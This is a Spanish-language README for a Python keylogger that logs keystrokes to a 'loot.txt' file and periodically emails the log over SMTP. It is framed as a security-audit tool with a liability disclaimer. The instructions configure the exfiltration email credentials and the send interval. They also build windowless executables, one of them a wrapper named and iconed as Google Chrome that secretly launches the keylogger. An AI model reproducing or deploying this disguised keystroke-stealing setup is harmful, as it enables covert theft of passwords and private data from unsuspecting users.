# Keylogger SMTP

Este es un keylogger desarrollado en Python 3.10 que registra las pulsaciones de teclas del usuario en un archivo de texto llamado 'loot.txt'. El objetivo principal de este script es proporcionar una herramienta para realizar auditorías de seguridad.

### Características:
- Captura pulsaciones de teclas y las registra en un archivo de texto.
- Detecta el estado de la tecla Caps Lock para registrar las letras en mayúsculas o minúsculas según corresponda.
- Ignora las teclas de control (Ctrl), Alt y Alt Gr para evitar el registro de comandos del sistema.
- Periodicamente, el contenido del archivo 'loot.txt' será enviado por correo electrónico utilizando el protocolo SMTP y se elimina el contenido del archivo 'loot.txt' para evitar conflictos y duplicado de informacion.

### Instrucciones de Uso:
- instalamos estas librerias para el correcto funcionamiento
  
      pip install keyboard
      pip install psutil
- Mofica las lineas 67, 68 y 69 del archivo `keycap.py`
(la contraseña de desarrollador no es la misma con la que accedes al correo)

      fromaddr = 'correo_receptor@gmail.com'
      toaddr = 'correo_emisor@gmail.com'
      password = 'contraseña_desarrollador_de_correo_emisor'

- La linea 109 del archivo `keycap.py`
(Te permite cambiar el tiempo que captura las pulsaciones luego que pase este tiempo se envian)

      if elapsed_time >= 1800:  # Si ha pasado 30 minuto

- El archivo `Google_Chorme.py`
  (cuando ejecutes este script verificara si keycap.exe esta siendo ejecuto, si esta siendo ejecutado solo abrira google, si no esta siendo ejecutado ejecutara keycap.exe ambos deben estar en el mismo directorio)
- para pasar de .py a .exe instalamos pyinstaller
  
      pip install pyinstaller

- Nos dirigimos al directorio donde se encuentran los scripts y ejecutamos estos comandos
  
      pyinstaller --onefile --noconsole --icon=engra.ico kycap.py
      pyinstaller --onefile --noconsole --icon=chorme.ico Google_Chorme.py
### Exención de Responsabilidad:
El desarrollador de este software no se hace responsable de ningún uso indebido, ilegal o inapropiado de esta herramienta. El usuario asume toda la responsabilidad por las acciones realizadas con este keylogger.

Al utilizar este software, el usuario acepta y reconoce los términos y condiciones descritos anteriormente. Por favor, utilice esta herramienta de manera responsable y ética.
